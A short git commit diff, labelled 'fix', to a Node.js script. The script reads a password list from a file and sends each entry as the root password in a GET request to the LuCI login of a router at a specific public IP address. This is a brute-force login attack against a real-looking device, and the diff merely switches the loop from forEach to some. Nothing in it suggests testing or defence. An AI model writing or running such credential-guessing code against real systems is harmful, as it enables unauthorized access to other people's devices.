9ce2c52a3e7dd65c67591f742340dfabd85b7be4
Gico735 <gic0@bk.ru>
2019-03-04 20:00:13 +0300

    fix

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const fs = require('fs')
 const request = require('request');
 const list = fs.readFileSync('./list.txt', 'UTF-8').split('\n')
 
-list.forEach(pass => {
+list.some(pass => {
   request.get({ url: `http://78.155.207.220:9080/cgi-bin/luci?username=root&password=${pass}` }, ((err, res, body) => {
     if (err) {
       console.log(err)
